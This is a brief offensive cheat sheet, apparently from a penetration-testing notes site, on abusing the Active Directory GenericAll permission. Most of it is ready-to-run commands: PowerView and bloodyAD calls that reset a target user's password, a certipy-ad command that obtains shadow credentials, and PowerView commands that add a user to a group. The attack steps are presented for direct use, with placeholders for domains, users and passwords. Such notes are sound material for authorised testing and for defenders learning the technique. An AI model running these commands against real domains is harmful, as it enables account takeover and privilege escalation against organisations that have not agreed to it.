---
title: "GenericAll"
date: 2024-7-12
tags: ["GenericAll", "active driectory", "ad", "Windows", "shadow credentials"]
---

---
### Abuse #1: Change target user password (From Windows)

#### 1. Import PowerView.ps1 

```powershell
. .\PowerView.ps1
```

#### 2. Change target user password

```powershell
$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force 
```

```powershell
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password
```

### Abuse #1: Change target user password (From Linux)

[bloodyAD](https://github.com/CravateRouge/bloodyAD)

```bash
python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> set password <TARGET_USER> <NEW_PASSWORD>
```

### Abuse #2: Get shadow credentials (From Linux)

```bash
sudo ntpdate -s <DC> && certipy-ad shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -k -account <TARGET_USER> -target <DC>
```

### Abuse #3 : Add user to group (From Windows)

#### 1. Import PowerView.ps1 

```powershell
. .\PowerView.ps1
```

#### 2. Create cred object (runas) \[optional\]

```powershell
$username = "<DOMAIN>\<USER>"
```

```powershell
$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
```

```powershell
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 2. Add user to group

```powershell
Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USER> -Credential $cred
```

<br>